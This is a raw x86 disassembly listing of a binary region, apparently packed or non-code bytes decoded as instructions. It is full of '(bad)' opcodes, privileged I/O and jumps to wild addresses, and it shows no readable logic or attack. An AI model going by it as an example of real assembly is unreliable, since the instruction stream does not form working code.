  42731a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42731b:	add    ebp,ebx
  42731d:	adc    al,0xb6
  42731f:	mov    eax,0xc2658c18
  427324:	sbb    ch,bl
  427326:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427327:	cmp    eax,0x45fa6d14
  42732c:	popf   
  42732d:	cmp    eax,0xcaa37e3f
  427332:	jb     0x42731b
  427334:	inc    edx
  427335:	xor    BYTE PTR [eax-0x72542edf],0x4c
  42733c:	enter  0x4e5,0x7c
  427340:	lds    ebx,FWORD PTR [esi+0x553e538b]
  427346:	rcl    BYTE PTR [ebp+0x4d45ab1f],1
  42734c:	stc    
  42734d:	je     0x427359
  42734f:	xchg   di,ax
  427351:	push   ss
  427352:	daa    
  427353:	mov    al,0x62
  427355:	imul   esi,DWORD PTR [ebp+0xa],0x36
  427359:	dec    edi
  42735a:	ds pop es
  42735c:	aaa    
  42735d:	repnz mov ebx,0x3c0107e6
  427363:	xlat   BYTE PTR ds:[ebx]
  427364:	test   DWORD PTR ds:[eax-0x4f1ac483],esi
  42736b:	xor    bl,ch
  42736d:	test   eax,0x971d761f
  427372:	inc    esp
  427373:	repz add eax,0x33a27f19
  427379:	mov    ch,BYTE PTR [edi+0x12]
  42737c:	or     DWORD PTR [ebp-0x3a],esp
  42737f:	pop    ebp
  427380:	add    ebp,ebp
  427382:	mov    bh,0xe8
  427384:	pop    ecx
  427385:	adc    bh,bh
  427387:	in     eax,dx
  427388:	add    ah,BYTE PTR [esi+0xfac3334]
  42738e:	cdq    
  42738f:	ds ja  0x4273de
  427392:	arpl   WORD PTR [edx],si
  427394:	retf   
  427395:	sbb    BYTE PTR [ecx+0x4a54f6dd],dl
  42739b:	cli    
  42739c:	mov    ebx,0x5eeea5fa
  4273a1:	ror    ah,0x6
  4273a4:	loope  0x427366
  4273a6:	adc    eax,0x13b590d4
  4273ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4273ac:	push   0xffffffb6
  4273ae:	xor    eax,0xcb216ac8
  4273b3:	sub    ecx,edi
  4273b5:	cmp    al,dl
  4273b7:	mov    al,0xc5
  4273b9:	jb     0x427361
  4273bb:	imul   ebp,DWORD PTR [edx-0x405b23f0],0x0
	...
  427432:	add    BYTE PTR [eax],al
  427434:	imul   ebp,DWORD PTR [edi-0x78],0xe9ef8e08
  42743b:	outs   dx,DWORD PTR ds:[esi]
  42743c:	pop    DWORD PTR [ebx+eiz*8-0x16]
  427440:	(bad)  
  427441:	push   ecx
  427442:	imul   ebp,DWORD PTR [ebx],0x20
  427445:	mov    eax,ds:0xf50001
  42744a:	add    BYTE PTR [eax],al
  42744c:	push   esi
  42744d:	stos   DWORD PTR es:[edi],eax
  42744e:	push   ecx
  42744f:	adc    BYTE PTR [eax-0x229590],ah
  427455:	(bad)  
  427456:	outs   dx,BYTE PTR ds:[esi]
  427457:	imul   eax,DWORD PTR [ebp+0x47],0x30f3713d
  42745e:	xchg   ecx,eax
  42745f:	bound  ebx,QWORD PTR [ecx]
  427461:	into   
  427462:	repnz les dx,DWORD PTR [ebx+0x2d]
  427467:	pop    ecx
  427468:	pushf  
  427469:	data16 cmp BYTE PTR [ecx-0x4eae04f1],ah
  427470:	mov    eax,ds:0x5656271f
  427475:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427476:	arpl   WORD PTR [esi+0x0],sp
  427479:	adc    DWORD PTR [ebx+0x27],ebp
  42747c:	jmp    0x279d674c
  427481:	dec    ebx
  427482:	add    eax,0x4432f73e
  427487:	xor    DWORD PTR [ebp-0x62],ebx
  42748a:	dec    edx
  42748b:	mov    al,0x73
  42748d:	cmc    
  42748e:	mov    ebp,0xf88b71a1
  427493:	lds    ebp,FWORD PTR [ebp-0x5a]
  427496:	test   dh,cl
  427498:	fst    QWORD PTR [eax]
  42749a:	sbb    BYTE PTR [edi-0x66b546d9],bh
  4274a0:	push   edx
  4274a1:	aam    0x74
  4274a3:	clc    
  4274a4:	popf   
  4274a5:	and    BYTE PTR [ebx],al
  4274a7:	scas   eax,DWORD PTR es:[edi]
  4274a8:	xchg   ebx,eax
  4274a9:	mov    dh,0xc3
  4274ab:	stos   BYTE PTR es:[edi],al
  4274ac:	aad    0x43
  4274ae:	loope  0x427465
  4274b0:	aam    0x4f
  4274b2:	test   BYTE PTR [edi],dh
  4274b4:	mov    ah,0x9a
  4274b6:	rol    ecx,1
  4274b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4274b9:	test   BYTE PTR [eiz*4-0x2b968eee],0x82
  4274c1:	mov    eax,0x9d11cc4d
  4274c6:	sbb    BYTE PTR [edi],dh
  4274c8:	mov    ebx,ecx
  4274ca:	mov    ?,WORD PTR [edx+0x3fc4cb51]
  4274d0:	mov    ebx,0xa666c580
  4274d5:	test   BYTE PTR [ebx-0x4c],dh
  4274d8:	mov    ah,0x4a
  4274da:	(bad)  
  4274dc:	or     BYTE PTR [edi+eax*1+0x45],dl
  4274e0:	in     al,0xe5
  4274e2:	aam    0x7d
  4274e4:	das    
  4274e5:	test   al,0x1b
  4274e7:	ret    
  4274e8:	ja     0x42753b
  4274ea:	ret    
  4274eb:	xchg   DWORD PTR [esp+esi*4],edi
  4274ee:	push   ss
  4274ef:	lock arpl dx,ax
  4274f2:	aaa    
  4274f3:	cmp    eax,0x652ce5ae
  4274f8:	push   esp
  4274f9:	jno    0x4274c6
  4274fb:	mov    ebp,0xe649c7b
  427500:	jge    0x42756a
  427502:	sub    DWORD PTR [ebx],ecx
  427504:	bound  ecx,QWORD PTR [edx]
  427506:	(bad)  
  427507:	jg     0x4274a0
  427509:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42750a:	pop    ebx
  42750b:	fld    QWORD PTR [edx]
  42750d:	popf   
  42750e:	sbb    esi,esp
  427510:	or     eax,0x8c7a1251
  427515:	es in  eax,0x11
  427518:	stc    
  427519:	in     eax,dx
  42751a:	and    ch,BYTE PTR [esi+ebx*2+0x1f]
  42751e:	sub    al,0xc3
  427520:	into   
  427521:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427522:	pop    esi
  427523:	popf   
  427524:	ror    esi,cl
  427526:	or     ecx,ebp
  427528:	test   eax,0x975fed0d
  42752d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42752e:	test   DWORD PTR [esi+ebx*2+0x17],eax
  427532:	add    dh,al
  427534:	mov    WORD PTR [edi+0x32ff5ef8],gs
  42753a:	leave  
  42753b:	mov    eax,0xe387072e
  427540:	test   DWORD PTR [eax],0x0
	...
  4275b2:	add    BYTE PTR [eax],al
  4275b4:	adc    cl,bl
  4275b6:	sbb    DWORD PTR [edx],0xcb9b5ad9
  4275bc:	mov    ds:0xe99a8b87,al
  4275c1:	inc    esi
  4275c2:	dec    ebp
  4275c3:	fist   WORD PTR ds:0xf50001a2
  4275c9:	add    BYTE PTR [eax],al
  4275cb:	add    BYTE PTR [edi-0x28],dh
  4275ce:	imul   eax,esp,0xffffff8e
  4275d1:	loope  0x427590
  4275d3:	js     0x42760d
  4275d5:	inc    esi
  4275d6:	sub    al,0xcd
  4275d8:	mul    eax
  4275da:	adc    edi,DWORD PTR [ecx+0x77f52a8f]
  4275e0:	and    ch,ah
  4275e2:	pop    ebx
  4275e3:	sbb    DWORD PTR [esi+0x3b3c389f],ebx
  4275e9:	mov    cl,0x6
  4275eb:	jbe    0x4275a7
  4275ed:	adc    BYTE PTR [eax-0x4dc5c693],cl
  4275f3:	(bad)  
  4275f4:	xchg   edi,eax
  4275f5:	enter  0xb5df,0xc1
  4275f9:	cmc    
  4275fa:	mov    esi,0x74c56391
  4275ff:	sub    esp,DWORD PTR [eax-0x7e105d4d]
  427605:	ss js  0x427647
  427608:	pop    edi
  427609:	pushf  
  42760a:	add    DWORD PTR [ebx-0x47],0x6d
  42760e:	inc    eax
  42760f:	pop    ds
  427610:	pusha  
  427611:	mov    ah,0x81
  427613:	add    ch,BYTE PTR [ecx-0x80]
  427616:	test   dh,ch
  427618:	aaa    
  427619:	mov    eax,ds:0x77d5c206
  42761e:	xchg   ebp,eax
  42761f:	sub    ebp,DWORD PTR [eax]
  427621:	xor    BYTE PTR [edi-0x6c29af67],ah
  427627:	fld    TBYTE PTR [ecx+eax*8]
  42762a:	es icebp 
  42762c:	ret    0x20c2
  42762f:	mov    al,BYTE PTR [esi]
  427631:	mov    ebp,0xf14e8e31
  427636:	out    0x91,eax
  427638:	lea    eax,[edi]
  42763a:	adc    DWORD PTR [ebx-0x57b36dd6],esi
  427640:	out    dx,eax
  427641:	pushf  
  427642:	and    DWORD PTR [ebx],ebp
  427644:	fidivr DWORD PTR [ebp+0x10]
  427647:	sub    BYTE PTR [ecx],cl
  427649:	jecxz  0x427697
  42764b:	ins    DWORD PTR es:[edi],dx
  42764c:	ror    ebx,1
  42764e:	ret    
  42764f:	push   ebx
  427650:	or     DWORD PTR [edx],ebp
  427652:	test   BYTE PTR [ebp-0xb],0x8c
  427656:	outs   dx,BYTE PTR ds:[esi]
  427657:	push   ebx
  427658:	or     edx,DWORD PTR [ebp+0x34]
  42765b:	xchg   ecx,eax
  42765c:	lods   eax,DWORD PTR ds:[esi]
  42765d:	mov    ecx,0x68a33a18
  427662:	push   cs
  427663:	cmp    DWORD PTR [esi+0x2000d100],0x5fc49065
  42766d:	mov    BYTE PTR [eax],bl
  42766f:	or     ch,0x7c
  427672:	rcr    DWORD PTR [esp+ecx*2-0x7ccfda6a],cl
  427679:	jns    0x4276c5
  42767b:	fild   DWORD PTR [edx-0x23]
  42767e:	jmp    0x57432af6
  427683:	jnp    0x42765b
  427685:	dec    esp
  427686:	dec    esi
  427687:	stos   BYTE PTR es:[edi],al
  427688:	xor    edx,esi
  42768a:	add    BYTE PTR [eax+esi*4+0x4d304faa],dl
  427691:	pop    ebp
  427692:	test   al,0x50
  427694:	adc    BYTE PTR [eax-0xd],bl
  427697:	jl     0x4276d8
  427699:	jnp    0x4276b0
  42769b:	push   eax
  42769c:	fidivr DWORD PTR [ebx+edi*2]
  42769f:	test   eax,0x2805ee6
  4276a4:	out    0x81,al
  4276a6:	int3   
  4276a7:	jle    0x427715
  4276a9:	sar    bh,1
  4276ab:	bound  ebx,QWORD PTR [esi]
  4276ad:	jnp    0x427662
  4276af:	in     al,0x2
  4276b1:	test   al,0xa7
  4276b3:	jmp    0x841f:0x24cd55c7
  4276ba:	aad    0x3e
  4276bc:	lock imul esi,DWORD PTR [ebx+0x36f8],0x0
	...
  427734:	mov    eax,0xff2ace8d
  427739:	imul   edi,esp,0xffffff9f
  42773c:	and    al,0x37
  42773e:	or     al,0x49
  427740:	add    BYTE PTR [ebp+0x46],bh
  427743:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427744:	or     ah,BYTE PTR [ebx+0xf50001]
  42774a:	add    BYTE PTR [eax],al
  42774c:	pop    ebx
  42774d:	(bad)  
  42774e:	and    eax,0x3431e019
  427753:	out    0x78,eax
  427755:	fbld   TBYTE PTR [edx+0x2e677e50]
  42775b:	xchg   esp,eax
  42775c:	je     0x427790
  42775e:	enter  0x5c5a,0xc
  427762:	fmul   QWORD PTR [ebx+0x4164983b]
  427768:	xchg   ecx,eax
  427769:	mov    BYTE PTR [eax+0x4b],bl
  42776c:	jle    0x427788
  42776e:	mov    ch,0xa8
  427770:	mov    edx,ds
  427772:	dec    ecx
  427773:	mov    bl,0x3a
  427775:	sbb    cl,0x8
  427778:	outs   dx,BYTE PTR ds:[esi]
  427779:	sub    DWORD PTR [ecx],0x74
  42777c:	push   edx
  42777d:	cs and al,0x44
  427780:	js     0x427764
  427782:	pop    ebp
  427783:	cmpps  xmm5,XMMWORD PTR [ecx],0x1d
  427787:	cmp    al,0x61
  427789:	popa   
  42778a:	jno    0x427750
  42778c:	jg     0x427724
  42778e:	dec    edx
  42778f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427790:	shl    BYTE PTR [ebp+0xa0339ae],cl
  427796:	xchg   esp,eax
  427797:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427798:	fsubr  DWORD PTR [edx-0xf9a854b]
  42779e:	imul   esi,DWORD PTR [eax],0xffffffea
  4277a1:	das    
  4277a2:	retf   
  4277a3:	lahf   
  4277a4:	dec    esi
  4277a5:	add    dh,BYTE PTR [edi+0x63efdc05]
  4277ab:	gs lahf 
  4277ad:	retf   0x988a
  4277b0:	jo     0x42779c
  4277b2:	sbb    eax,0x568fa73c
  4277b7:	dec    ecx
  4277b8:	leave  
  4277b9:	retf   0xed35
  4277bc:	mov    ebp,0x26538482
  4277c1:	xchg   BYTE PTR [edx],bl
  4277c3:	popa   
  4277c4:	sbb    DWORD PTR [ecx-0x3a],0xffffffca
  4277c8:	add    DWORD PTR [ebx-0x57fc6d28],0x13
  4277cf:	xchg   esp,eax
  4277d0:	sti    
  4277d1:	add    al,0x67
  4277d3:	(bad)  
  4277d4:	mov    ds:0x903e50f9,al
  4277d9:	pop    esp
  4277da:	or     bl,BYTE PTR [ecx+ebp*2-0x1e636e9a]
  4277e1:	lods   eax,DWORD PTR ds:[esi]
  4277e2:	jns    0x42785a
  4277e4:	fprem1 
  4277e6:	cmp    al,0x42
  4277e8:	jb     0x4277ca
  4277ea:	sar    esi,0x62
  4277ed:	dec    esi
  4277ee:	(bad)  
  4277ef:	ins    DWORD PTR es:[edi],dx
  4277f0:	mov    eax,0x9afc5054
  4277f5:	push   ecx
  4277f6:	mov    ?,WORD PTR [ecx+esi*1-0x2f801485]
  4277fd:	push   ebp
  4277fe:	lock push ebp
  427800:	mov    cl,ah
  427802:	int    0x57
  427804:	xor    al,0x2a
  427806:	pop    edi
  427807:	and    bh,BYTE PTR [ecx-0x4e]
  42780a:	dec    ebx
  42780b:	(bad)  
  42780d:	bound  edx,QWORD PTR [edi-0x4f]
  427810:	(bad)  
  427811:	jmp    0x49a1d43
  427816:	or     al,0x19
  427818:	paddw  mm5,mm2
  42781b:	lds    esi,FWORD PTR [ebp-0x57]
  42781e:	(bad)
  427821:	sbb    ebx,esp
  427823:	fiadd  WORD PTR [edx-0x1af9a80a]
  427829:	sbb    DWORD PTR [eax+0x1d6b31a0],edi
  42782f:	push   es
  427830:	ins    DWORD PTR es:[edi],dx
  427831:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427832:	pop    ebp
  427833:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427834:	mov    al,0x4d
  427836:	or     eax,0x18d342fd
  42783b:	inc    ebp
  42783c:	(bad)  
  42783d:	ror    DWORD PTR [ebx+0x1],1
  427840:	out    0x0,eax
	...
  4278b2:	add    BYTE PTR [eax],al
  4278b4:	mov    WORD PTR [esi+0x7d],cs
  4278b7:	jge    0x4278b8
  4278b9:	jg     0x427847
  4278bb:	dec    DWORD PTR [eax-0x5e]
  4278be:	(bad)  
  4278bf:	xchg   ecx,eax
  4278c0:	mov    ebx,0xffd6fc63
  4278c5:	mov    ds:0xf50001,eax
  4278ca:	add    BYTE PTR [eax],al
  4278cc:	add    BYTE PTR [ecx+ecx*1+0x77efe735],dl
  4278d3:	xchg   esp,eax
  4278d4:	mov    al,0x4
  4278d6:	jecxz  0x42790e
  4278d8:	xor    eax,0x2b56f6d
  4278dd:	jbe    0x4278e8
  4278df:	jbe    0x42791c
  4278e1:	int    0xb
  4278e3:	sbb    BYTE PTR [ebx],bh
  4278e5:	sub    ch,dl
  4278e7:	mov    dl,0xb
  4278e9:	popa   
  4278ea:	xor    ah,BYTE PTR [ebp+0x2f4c9dfe]
  4278f0:	xchg   ebp,eax
  4278f1:	mov    ch,0x3f
  4278f3:	sbb    bh,BYTE PTR [ebx]
  4278f5:	push   ebp
  4278f6:	mov    bl,0x24
  4278f8:	xor    ebx,edi
  4278fa:	push   edx
  4278fb:	cld    
  4278fc:	xor    DWORD PTR [ebx+0x19],ecx
  4278ff:	stos   BYTE PTR es:[edi],al
  427900:	inc    ebp
  427901:	mov    al,ds:0x33c36381
  427906:	out    dx,al
  427907:	test   BYTE PTR [ebp-0x4d7c4340],0xf9
  42790e:	or     BYTE PTR [ebx],ah
  427910:	in     eax,0xb2
  427912:	push   ecx
  427913:	or     al,BYTE PTR [edx+0x7329d336]
  427919:	(bad)  
  42791a:	cmp    BYTE PTR [edx+ecx*2],cl
  42791d:	rcr    DWORD PTR [ecx],0x81
  427920:	mov    ebp,eax
  427922:	stos   DWORD PTR es:[edi],eax
  427923:	jae    0x42799f
  427925:	push   ecx
  427926:	jno    0x427935
  427928:	(bad)  
  427929:	jb     0x4278e0
  42792b:	xchg   esi,eax
  42792c:	out    dx,al
  42792d:	jle    0x427936
  42792f:	xchg   esi,eax
  427930:	jo     0x4278fd
  427932:	pop    es
  427933:	and    eax,0xa5ac43b9
  427938:	js     0x427943
  42793a:	xchg   edx,eax
  42793b:	dec    ax
  42793d:	sbb    eax,0xd6009b32
  427942:	mov    ds:0xc7312204,al
  427947:	or     bl,BYTE PTR [ebx]
  427949:	xchg   esi,eax
  42794a:	js     0x427951
  42794c:	xor    eax,0xffc35685
  427951:	dec    edx
  427952:	in     al,dx
  427953:	lock shl DWORD PTR fs:[ecx],1
  427957:	dec    ebx
  427958:	xor    al,BYTE PTR [ebp+0x45cd096e]
  42795e:	xor    dl,BYTE PTR [edi+0x48ae578d]
  427964:	call   0xd203:0x1adf65d0
  42796b:	je     0x427970
  42796d:	stc    
  42796e:	sub    ebx,0xa
  427971:	std    
  427972:	stos   BYTE PTR es:[edi],al
  427973:	lock mov DWORD PTR [ecx-0x4f],0x8cedf393
  42797b:	push   ebp
  42797c:	cmc    
  42797d:	xchg   BYTE PTR [ebp+esi*4+0x29],bh
  427981:	add    eax,ebp
  427983:	mov    dh,0x3a
  427985:	xchg   BYTE PTR [ebp+0x4f49e397],dl
  42798b:	in     al,dx
  42798c:	(bad)  
  42798d:	sti    
  42798e:	xchg   esi,eax
  42798f:	jecxz  0x4279db
  427991:	(bad)  
  427992:	(bad)  
  427993:	fisttp QWORD PTR [ecx+0x36c25967]
  42799a:	mov    ds:0x6a927361,al
  42799f:	pushf  
  4279a0:	loop   0x4279d1
  4279a2:	mov    al,0x5a
  4279a4:	dec    esi
  4279a5:	add    al,0x41
  4279a7:	mov    esi,0xeb8fe145
  4279ac:	jecxz  0x427956
  4279ae:	fidiv  WORD PTR [edx-0x55cad0bd]
  4279b4:	push   ecx
  4279b5:	out    0xe5,eax
  4279b7:	push   ecx
  4279b8:	lea    ebp,[edi]
  4279ba:	push   esp
  4279bb:	mov    DWORD PTR [ebx],esp
  4279bd:	push   ebp
  4279be:	imul   edi,DWORD PTR [eax-0x3b],0x0
	...
  427a31:	add    BYTE PTR [eax],al
  427a33:	add    BYTE PTR [ecx-0x42a9f2d8],bl
  427a39:	ja     0x427a16
  427a3b:	out    dx,eax
  427a3c:	das    
  427a3d:	mov    ch,0xeb
  427a3f:	aam    0x57
  427a41:	adc    DWORD PTR ss:[esi+0x1a4f4],ebp
  427a48:	cmc    
  427a49:	add    BYTE PTR [eax],al
  427a4b:	add    BYTE PTR [edx],ch
  427a4d:	loop   0x427ac2
  427a4f:	shl    BYTE PTR ds:0x4d0f26c1,1
  427a55:	(bad)  
  427a56:	pushf  
  427a57:	and    eax,0xdb3b29a7
  427a5c:	xor    DWORD PTR [edx-0x568616b9],edi
  427a62:	pop    ecx
  427a63:	sbb    eax,0x25a0a004
  427a68:	in     eax,dx
  427a69:	aad    0xca
  427a6b:	mov    cl,BYTE PTR [eax-0x31]
  427a6e:	pop    ebp
  427a6f:	inc    eax
  427a70:	test   bl,0xc0
  427a73:	aad    0xc
  427a75:	ficom  DWORD PTR [ebx]
  427a77:	in     al,0xf5
  427a79:	sub    ah,BYTE PTR [ebp-0x35ef1842]
  427a7f:	pop    esi
  427a80:	fsub   DWORD PTR [eax+0x540bb86d]
  427a86:	xchg   ebx,eax
  427a87:	cmp    eax,0x967fd529
  427a8c:	push   edx
  427a8d:	mov    bl,0x44
  427a8f:	pop    edi
  427a90:	cmp    BYTE PTR [eax-0x59],cl
  427a93:	das    
  427a94:	jne    0x427a65
  427a96:	inc    edi
  427a97:	daa    
  427a98:	push   cs
  427a99:	ret    
  427a9a:	(bad)  
  427a9b:	cli    
  427a9c:	into   
  427a9d:	fcom   QWORD PTR [esi-0x7f06616]
  427aa3:	sub    DWORD PTR [eax-0x354f8bcf],esp
  427aa9:	push   edx
  427aaa:	mov    edi,0x55048b38
  427aaf:	test   DWORD PTR [ebx+eiz*1-0x60],ecx
  427ab3:	or     al,0x7c
  427ab6:	xor    eax,0x6bf05e64
  427abb:	sub    BYTE PTR gs:[ecx-0x31],al
  427abf:	mov    edx,0xb2679ff3
  427ac4:	mov    bl,0xac
  427ac6:	push   edx
  427ac7:	mov    ds:0x6a305874,al
  427acc:	fimul  DWORD PTR [ecx-0x33]
  427acf:	jno    0x427a7e
  427ad1:	ret    
  427ad2:	cmp    eax,0x8edd9fa3
  427ad7:	out    0xa8,eax
  427ad9:	imul   esi,eax,0x14a9c26f
  427adf:	sbb    ebp,DWORD PTR [edi]
  427ae1:	fwait
  427ae2:	pusha  
  427ae3:	adc    eax,ecx
  427ae5:	iret   
  427ae6:	loopne 0x427ac9
  427ae8:	adc    eax,0x12e6f1ab
  427aed:	in     eax,0xd5
  427aef:	xchg   edi,eax
  427af0:	mov    dl,ah
  427af2:	push   esp
  427af3:	push   ebp
  427af4:	pop    ds
  427af5:	sar    DWORD PTR [ebx+0xd1f3706],0xf9
  427afc:	add    dl,BYTE PTR [edi-0x3147d094]
  427b02:	xor    ebx,ecx
  427b04:	jae    0x427ac5
  427b06:	addr16 cld 
  427b08:	imul   esi,DWORD PTR [ecx+edi*4+0x6762c8c8],0x394f8fce
  427b13:	push   esi
  427b14:	ror    BYTE PTR [esi-0x21],cl
  427b17:	jg     0x427b50
  427b19:	pop    eax
  427b1a:	cwde   
  427b1b:	icebp  
  427b1c:	jno    0x427b71
  427b1e:	mov    edx,0x82ba1a39
  427b23:	push   cs
  427b24:	and    BYTE PTR [edi],bl
  427b26:	mov    ecx,edi
  427b28:	ins    DWORD PTR es:[edi],dx
  427b29:	fstp   DWORD PTR [edi+0x5a]
  427b2c:	jb     0x427b5a
  427b2e:	lods   al,BYTE PTR ds:[esi]
  427b2f:	inc    esp
  427b30:	shr    BYTE PTR [ebx-0x566ca93f],0x67
  427b37:	jmp    0x427af0
  427b39:	cmp    dl,BYTE PTR [edx+0x32]
  427b3c:	sub    eax,0x8088dca6
	...
  427bb1:	add    BYTE PTR [eax],al
  427bb3:	add    dl,ah
  427bb5:	pusha  
  427bb6:	test   DWORD PTR [esi+0x74f3f787],esi
  427bbc:	mov    eax,0x4f14fe65
  427bc1:	dec    eax
  427bc2:	cmp    bl,BYTE PTR [esi+0x1a5e9]
  427bc8:	cmc    
  427bc9:	add    BYTE PTR [eax],al
  427bcb:	add    BYTE PTR [ebp+0x2ffd1876],dl
  427bd1:	adc    al,0xf8
  427bd3:	idiv   DWORD PTR [ebp+0x2e]
  427bd6:	sub    al,0x87
  427bd8:	aaa    
  427bd9:	xchg   edx,eax
  427bda:	pop    edi
  427bdb:	sbb    al,0xd1
  427bdd:	arpl   WORD PTR [eax+edx*8],dx
  427be0:	ret    0x96d7
  427be3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427be4:	clc    
  427be5:	aaa    
  427be6:	(bad)  
  427be8:	call   0xccdd0973
  427bed:	cwde   
  427bee:	jnp    0x427b7e
  427bf0:	push   edi
  427bf1:	jns    0x427bd1
  427bf3:	push   esi
  427bf4:	aaa    
  427bf5:	sbb    al,0x81
  427bf7:	(bad)  
  427bf9:	loopne 0x427c4c
  427bfb:	jnp    0x427c4a
  427bfd:	mov    BYTE PTR [ebx],cl
  427bff:	jno    0x427c7e
  427c01:	imul   BYTE PTR [edi+0x7]
  427c04:	stos   DWORD PTR es:[edi],eax
  427c05:	pushf  
  427c06:	fdiv   st,st(2)
  427c08:	ins    DWORD PTR es:[edi],dx
  427c09:	std    
  427c0a:	icebp  
  427c0b:	pop    esp
  427c0c:	pop    esp
  427c0d:	lea    edi,[edi+0x7a]
  427c10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427c11:	xchg   esp,eax
  427c12:	sub    al,BYTE PTR [ebx]
  427c14:	outs   dx,BYTE PTR ds:[esi]
  427c15:	jp     0x427bf6
  427c17:	mov    ecx,0x3deaeebe
  427c1c:	clc    
  427c1d:	loope  0x427c10
  427c1f:	arpl   bp,ax
  427c21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427c22:	adc    DWORD PTR [edi-0x24],ebp
  427c25:	jge    0x427c30
  427c27:	cs add eax,0x417381da
  427c2d:	or     ax,0x48d2
  427c31:	lods   eax,DWORD PTR es:[esi]
  427c33:	sub    eax,0xf9d0069c
  427c38:	and    BYTE PTR [edx-0x2b4c0292],cl
  427c3e:	bound  esp,QWORD PTR [esi+ecx*2+0x4fc1f7c0]
  427c45:	jp     0x427c13
  427c47:	push   eax
  427c48:	sbb    eax,0x497c8830
  427c4d:	stos   BYTE PTR es:[edi],al
  427c4e:	mov    ecx,0xc6c546e4
  427c53:	dec    eax
  427c54:	push   es
  427c55:	cwde   
  427c56:	scas   eax,DWORD PTR es:[edi]
  427c57:	sub    DWORD PTR [ebx+0x3b7f7ec1],ecx
  427c5d:	sub    ah,BYTE PTR [eax-0x1bb3c537]
  427c63:	cld    
  427c64:	icebp  
  427c65:	in     al,0x18
  427c67:	in     al,0xbb
  427c69:	scas   eax,DWORD PTR es:[edi]
  427c6a:	cmc    
  427c6b:	fisubr DWORD PTR [esi]
  427c6d:	hlt    
  427c6e:	adc    eax,0xca96b2c6
  427c73:	xchg   ebx,eax
  427c74:	jnp    0x427ca7
  427c76:	mov    ecx,0x73544fdf
  427c7b:	adc    bl,BYTE PTR ds:0x1f7f565c
  427c81:	sbb    al,0x6c
  427c83:	stos   DWORD PTR es:[edi],eax
  427c84:	hlt    
  427c85:	in     eax,0x32
  427c87:	aam    0xd9
  427c89:	jb     0x427c83
  427c8b:	lods   al,BYTE PTR ds:[esi]
  427c8c:	cwde   
  427c8d:	ins    DWORD PTR es:[edi],dx
  427c8e:	scas   al,BYTE PTR es:[edi]
  427c8f:	mov    WORD PTR [esi-0x43],ds
  427c92:	popa   
  427c93:	ret    0xa35f
  427c96:	jl     0x427cd6
  427c98:	ins    BYTE PTR es:[edi],dx
  427c99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427c9a:	inc    ebx
  427c9b:	dec    edx
  427c9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427c9d:	fisttp DWORD PTR [ebp-0x6e]
  427ca0:	pop    eax
  427ca1:	mov    dh,BYTE PTR [ebx]
  427ca3:	push   0x1e7af8e0
  427ca8:	int3   
  427ca9:	cmc    
  427caa:	adc    DWORD PTR [ecx],esi
  427cac:	cmp    BYTE PTR [esp+esi*2+0x4e],bh
  427cb0:	mov    ds:0x578fbe98,al
  427cb5:	ins    DWORD PTR es:[edi],dx
  427cb6:	mov    ds:0xce9eaab7,al
  427cbb:	and    BYTE PTR ds:0xdb4cfbbd,dh
	...
  427d31:	add    BYTE PTR [eax],al
  427d33:	add    BYTE PTR [edx],cl
  427d35:	mov    cl,0x61
  427d37:	repz sti 
  427d39:	repz call 0x62a1:0xdc63ecf9
  427d41:	jbe    0x427d34
  427d43:	pop    eax
  427d44:	fisub  WORD PTR [esi+0xf50001]
  427d4a:	add    BYTE PTR [eax],al
  427d4c:	or     ch,BYTE PTR [edx]
  427d4e:	pop    esp
  427d4f:	push   ss
  427d50:	cwde   
  427d51:	mov    eax,ds:0xd429f3dc
  427d56:	dec    edx
  427d57:	int3   
  427d58:	int3   
  427d59:	call   0xf7a2:0xd48cbd7b
  427d60:	add    DWORD PTR [esi-0x4aff596c],eax
  427d66:	cld    
  427d67:	and    al,0x1b
  427d69:	or     dh,dh
  427d6b:	and    BYTE PTR [ebp-0x6794383d],cl
  427d71:	push   es
  427d72:	dec    ebp
  427d73:	and    dh,BYTE PTR [ebp+0x2efb0e72]
  427d79:	std    
  427d7a:	imul   ebx,DWORD PTR [esi],0xffffffb2
  427d7d:	jnp    0x427d58
  427d7f:	shr    ecx,1
  427d81:	xor    edi,DWORD PTR [ecx-0xdbc32f]
  427d87:	inc    ebp
  427d88:	dec    esi
  427d89:	mov    al,ds:0x2a13329f
  427d8e:	xchg   ebp,eax
  427d8f:	xchg   BYTE PTR [edx],dh
  427d91:	add    al,0xdf
  427d93:	add    edi,DWORD PTR [eax]
  427d95:	sub    al,0x79
  427d97:	cdq    
  427d98:	mov    ds:0xeded59d1,al
  427d9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427d9e:	pop    ebx
  427d9f:	inc    esi
  427da0:	aad    0x57
  427da2:	ja     0x427d29
  427da4:	repnz mov eax,ds:0x7b3f1be2
  427daa:	dec    edx
  427dab:	sar    al,1
  427dad:	push   edi
  427dae:	loop   0x427d7b
  427db0:	sub    ah,BYTE PTR [eax]
  427db2:	or     ah,BYTE PTR [ebx+0x29]
  427db5:	add    al,0x2
  427db7:	mul    BYTE PTR [ebp-0xf]
  427dba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427dbb:	mov    ecx,0x28818543
  427dc0:	jno    0x427dfb
  427dc2:	ror    BYTE PTR [esi+ebp*1],cl
  427dc5:	sbb    al,BYTE PTR [esp+ebp*8-0x9d2dd83]
  427dcc:	xor    eax,0x4fe1a5cb
  427dd1:	jmp    0x427e40
  427dd3:	fisttp QWORD PTR [eax]
  427dd5:	mov    bh,0x52
